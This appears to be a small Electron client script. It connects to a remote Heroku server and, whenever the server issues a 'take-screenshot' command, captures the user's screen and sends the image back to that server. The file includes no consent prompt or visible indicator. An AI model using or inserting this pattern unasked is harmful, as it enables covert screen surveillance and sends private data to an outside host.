const {ipcRenderer} = require('electron');
const serverUrl = 'https://paranoia-server.herokuapp.com';
const socket = io(serverUrl);

socket.on('connect', function() {
  socket.emit('client-connected');
});

socket.on('disconnect', function() {
  socket.emit('client-disconnected');
})

socket.on('take-screenshot', async function() {
  const result = await ipcRenderer.invoke('screenshot');
  socket.emit('took-screenshot', result);
});
